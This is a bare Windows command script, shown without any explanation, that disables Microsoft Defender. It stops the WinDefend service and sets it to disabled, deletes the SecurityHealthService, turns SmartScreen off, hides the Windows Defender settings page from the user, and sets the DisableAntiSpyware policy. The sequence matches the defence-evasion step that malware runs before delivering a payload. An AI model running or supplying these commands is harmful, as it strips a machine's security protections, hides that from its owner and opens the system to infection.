$svcs = @("WinDefend", "Sense", "WdBoot", "WdFilter", "WdNisSvc", "WdNisDrv")
wmic Path Win32_BaseService.Name='WinDefend' Call StopService
wmic Path Win32_BaseService.Name='WinDefend' Call ChangeStartMode Disabled
wmic Service Where Name='SecurityHealthService' Delete
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v SettingsPageVisibility /t REG_SZ /d hide:windowsdefender /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
